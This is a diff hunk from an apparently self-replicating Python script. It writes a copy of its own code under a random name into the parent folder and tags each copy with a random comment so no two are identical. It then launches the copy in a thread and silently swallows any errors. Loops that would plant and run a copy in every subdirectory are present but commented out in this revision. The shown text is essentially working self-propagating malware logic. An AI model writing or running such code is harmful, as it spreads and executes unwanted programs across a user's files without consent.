@@ -57,27 +57,34 @@ f.close()
 #Create the new file and include a different name
 filename = "newpython{randomness}.py".format(randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))
 
+
 #start copying the contents of the files to the new one
-if os.access("..\\", os.W_OK):
-    print("..\\" + filename)
+try:
     h = open("..\\" + filename, "w")
     previousFolder(h, lines)
     h.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
     h.close()
-if os.path.isfile("..\\" + filename):
-    thread = Thread(target=runFunc("..\\" + filename))
-    thread.start()
+    if os.path.isfile("..\\" + filename):
+        thread = Thread(target=runFunc("..\\" + filename))
+        thread.start()
 
-for x in os.walk(directory):
-    g = open(x[0] + "/" + filename, "w")
-    print(x[0] + "/" + "printing here")
-    writeIntoFile(g, lines)
-    g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
-    g.close()
+except:
+    pass
 
-for x in os.walk(directory):
-    thread = Thread(target=runFunc(x[0] + "/" + filename))
-    thread.start()
+
+    
+    
+
+#for x in os.walk(directory):
+#    g = open(x[0] + "/" + filename, "w")
+#    print(x[0] + "/" + "printing here")
+#    writeIntoFile(g, lines)
+#    g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
+#    g.close()
+
+#for x in os.walk(directory):
+#    thread = Thread(target=runFunc(x[0] + "/" + filename))
+#    thread.start()
 
 
 
